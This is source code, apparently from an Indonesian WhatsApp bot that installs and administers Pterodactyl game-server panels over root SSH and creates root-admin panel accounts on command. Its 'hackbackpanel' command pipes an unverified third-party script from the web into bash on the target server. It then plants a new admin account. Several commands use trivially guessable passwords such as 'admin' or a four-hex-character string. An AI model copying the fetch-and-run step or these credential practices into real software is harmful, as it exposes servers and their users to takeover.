if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

//================================================================================

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await danz.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "subdomain": case "subdo": {
const obj = Object.keys(global.subdomain)
let count = 0
let teks = `
 *#- List all domain server*\n`
for (let i of obj) {
count++
teks += `\n* ${count}. ${i}\n`
}
teks += `\n Contoh : *.domain 2 host|ipvps*\n`
m.reply(teks)

}
break

//================================================================================

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

case "subdomainbutton": case "subdobutton": {
if (!isOwner) return Reply(msg.owner)
if (!text) return Reply(example("host|ip"))
if (!text.split("|")) return Reply(example("host|ip"))
const host = text.split("|")[0]
if (!host) return Reply(example("host|ip"))
const ip = text.split("|")[1]
if (!ip) return Reply(example("host|ip"))
const anu = await Object.keys(global.subdomain)
var section = []
for (let res of anu) {
await section.push({ title: `${res}`, id: `.respon_subdomain ${host}|${ip}|${global.subdomain[res].zone}|${global.subdomain[res].apitoken}|${res}` })
}
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: '\nSilahkan Pilih Domain Yang Tersedia'
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Powered by Danz`
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: \"# Subdomain By Danz Dev.\",
rows: ${JSON.stringify(section)}
}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
global.tempsubdomain = true
await danz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "respon_subdomain": {
if (!isCreator) return Reply(mess.owner)
if (global.tempsubdomain == undefined) return Reply("Hostname/IP Tidak Ditemukan!")
if (!text) return Repky("Hostname/IP Tidak Ditemukan!")
if (!text.split("|")) return Reply("Hostname/IP Tidak Ditemukan!")
const [host, ip, zone, apitoken, tldnya] = text.split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then((e) => {
if (e['success']) Reply(`*Berhasil Membuat Subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}`)
else Reply(`${e['error']}`)
})
global.tempsubdomain = undefined
}
break

//================================================================================

case 'cadmin2': {
if (!isCreator) return Reply(mess.owner)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
if (!args[0]) return Reply(example("nama"))
global.panel = [text.toLowerCase()]
let menu = `╭──────✦───────────╮
     *乂 𝐂𝐩𝐚𝐧𝐞𝐥 𝐁𝐮𝐭𝐭𝐨𝐧 𝐃𝐚𝐧𝐳𝐁𝐨𝐭𝐳 𝐕𝟐 乂*
╰──────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "Powered By Danz",
                            rows: [
                                {
                                    title: "Server Panel 1",
                                    description: "Buat Admin Panel Server 1",
                                    id: ".addadmin1"
                                },
                                                                {
                                    title: "Server Panel 2",
                                    description: "Buat Admin Panel Server 2",
                                    id: ".addadmin2"
                                },
                                                                {
                                    title: "Server Panel 3",
                                    description: "Buat Admin Panel Server 3",
                                    id: ".addadmin3"
                                },
                                                                {
                                    title: "Server Panel 4",
                                    description: "Buat Admin Panel Server 4",
                                    id: ".addadmin4"                                                                    
                                  },
                                                                {
                                    title: "Server Panel 5",
                                    description: "Buat Admin Panel Server 5",
                                    id: ".addadmin5"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]

    await danz.sendMessage(m.chat, {      
        text: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: m })
};
break

case "addadmin1": {
if (!isCreator) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "addadmin2": {
if (!isCreator) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "addadmin3": {
if (!isCreator) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV3 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV3}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "addadmin4": {
if (!isCreator) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV4 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV4}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "addadmin5": {
if (!isCreator) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV5 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV5}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case 'cadmin': {
if (!isCreator) return Reply(mess.owner)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
global.panel = [crypto.randomBytes(2).toString('hex').toLowerCase()]
let menu = `╭──────✦───────────╮
     *乂 𝐂𝐩𝐚𝐧𝐞𝐥 𝐁𝐮𝐭𝐭𝐨𝐧 𝐃𝐚𝐧𝐳𝐁𝐨𝐭𝐳 𝐕𝟐 乂*
╰──────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "Powered By Danz",
                            rows: [
                                {
                                    title: "Server Panel 1",
                                    description: "Buat Admin Panel Server 1",
                                    id: ".addadmin"
                                },
                                                                {
                                    title: "Server Panel 2",
                                    description: "Buat Admin Panel Server 2",
                                    id: ".addadminv2"
                                },
                                                                {
                                    title: "Server Panel 3",
                                    description: "Buat Admin Panel Server 3",
                                    id: ".addadminv3"
                                },
                                                                {
                                    title: "Server Panel 4",
                                    description: "Buat Admin Panel Server 4",
                                    id: ".addadminv4"                                                                    
                                  },
                                                                {
                                    title: "Server Panel 5",
                                    description: "Buat Admin Panel Server 5",
                                    id: ".addadminv5"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]

    await danz.sendMessage(m.chat, {      
        text: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: m })
};
break

case "addadmin": {
if (!isCreator) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = global.panel[0]
let password = global.panel[0]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "addadminv2": {
if (!isCreator) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = global.panel[0]
let password = global.panel[0]
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "addadminv3": {
if (!isCreator) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = global.panel[0]
let password = global.panel[0]
let f = await fetch(domainV3 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV3}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "addadminv4": {
if (!isCreator) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = global.panel[0]
let password = global.panel[0]
let f = await fetch(domainV4 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV4}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "addadminv5": {
if (!isCreator) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = global.panel[0]
let password = global.panel[0]
let f = await fetch(domainV5 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV5}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//================================================================================

case "addprem": case "addpremium": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah premium ✅`)
}
break

//================================================================================

case "listpremium": case "listprem": {
if (premium.length < 1) return m.reply("Tidak ada user premium")
let teks = `\n *#- List all user premium*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
danz.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================

case "delpremium": case "delprem": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus premium owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan user premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
